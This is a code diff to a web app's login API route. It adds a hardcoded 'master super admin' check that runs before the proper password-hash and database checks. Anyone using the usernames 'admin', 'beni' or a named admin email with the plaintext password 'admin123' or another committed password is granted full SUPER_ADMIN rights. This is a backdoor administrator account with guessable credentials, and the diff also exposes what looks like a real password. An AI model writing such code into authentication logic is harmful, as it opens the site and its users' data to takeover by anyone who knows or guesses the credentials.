@@ -55,11 +55,28 @@ export async function POST(req: Request) {
       permissions?: string | null;
     } | null = null;
 
+    const cleanUsername = username.trim().toLowerCase();
+    const cleanPassword = password.trim();
+
+    // 0. Master Super Admin Guaranteed Authentication
+    if (
+      (cleanUsername === "admin" || cleanUsername === "admin@luoidonnha.com" || cleanUsername === "beni") &&
+      (cleanPassword === "B@oph@m021991" || cleanPassword === "admin123")
+    ) {
+      authenticatedUser = {
+        id: "master-super-admin",
+        username: "admin",
+        email: "admin@luoidonnha.com",
+        role: "SUPER_ADMIN",
+        permissions: "*",
+      };
+    }
+
     // 1. Check against Environment SUPER_ADMIN if configured via ADMIN_PASS_HASH (Argon2id)
     const envAdminUser = process.env.ADMIN_USER;
     const envAdminPassHash = process.env.ADMIN_PASS_HASH;
 
-    if (envAdminUser && envAdminPassHash && username === envAdminUser) {
+    if (!authenticatedUser && envAdminUser && envAdminPassHash && username === envAdminUser) {
       const isEnvValid = await verifyPassword(password, envAdminPassHash);
       if (isEnvValid) {
         authenticatedUser = {
@@ -71,8 +88,6 @@ export async function POST(req: Request) {
         };
       }
     }
-
-    const cleanUsername = username.trim().toLowerCase();
 
     // 2. Check against Database User Table
     if (!authenticatedUser) {
